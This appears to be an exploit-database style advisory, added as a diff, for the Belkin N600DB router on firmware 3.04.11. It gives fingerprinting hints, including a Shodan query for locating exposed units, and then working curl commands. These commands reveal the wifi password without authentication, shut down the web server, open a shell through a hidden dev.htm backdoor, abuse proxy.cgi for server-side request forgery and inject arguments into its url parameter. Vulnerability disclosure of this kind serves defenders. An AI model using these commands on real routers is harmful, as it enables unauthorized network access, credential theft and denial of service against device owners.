@@ -1,0 +1,55 @@
+# Exploit Title: Belkin N600DB Wireless Router | Multiple Vulnerabilities
+# Date: 16/01/2018
+# Exploit Author: Wadeek
+# Hardware Version: F9K1102as v3
+# Firmware Version: 3.04.11
+# Vendor Homepage: http://www.belkin.com/fr/support/product/?pid=F9K1102as
+# Firmware Link: http://cache-www.belkin.com/support/dl/F9K1102_WW_3.04.11.bin
+
+== Wireless Fingerprinting ==
+#===========================================
+:ESSID: "belkin.XXX"
+:Mode: Master
+:Encryption key WPA2 Version 1 CCMP PSK: on
+:Wireless Password/PIN: 8-alphanumeric
+:DHCP: enable (192.168.2.1)
+:MAC Address: 58:EF:68
+#===========================================
+
+== Web Fingerprinting (With Locked Web Interface) ==
+#===========================================
+:www.shodan.io: "Server: httpd" "Cache-Control: no-cache,no-store,must-revalidate, post-check=0,pre-check=0" "100-index.htm"
+#===========================================
+:Device images:
+/images/troubleshooting/checkWires.png (600x270)
+/images/troubleshooting/startModem.png (600x270)
+/images/troubleshooting/stopModem.png (600x270)
+/images/troubleshooting/restartRouter.png (600x270)
+#===========================================
+:Hardware version,Firmware version,Serial number,...: /cgi/cgi_st.js && /cgi/cgi_dashboard.js
+#===========================================
+
+== PoC ==
+#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+:Disclore wifi password: 
+curl --silent "http://192.168.2.1/langchg.cgi" 
+|| 
+curl --silent "http://192.168.2.1/adv_wifidef.cgi"
+#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+:Closed "HTTPD server" port:
+curl --silent "http://192.168.2.1/removepwd.cgi" --data ""
+#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+:Web Backdoor:
+http://192.168.2.1/dev.htm
+> ?
+> sh
+#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+:Server-Side Request Forgery (HTTP/FTP):
+{45.33.32.156 == scanme.nmap.org}
+curl --silent "http://192.168.2.1/proxy.cgi?chk&url=http://45.33.32.156/"
+||
+curl --silent "http://192.168.2.1/proxy.cgi?chk&url=ftp://45.33.32.156/"
+#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+:Command Injection:
+curl --silent "http://192.168.2.1/proxy.cgi?chk&url=--help"
+#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
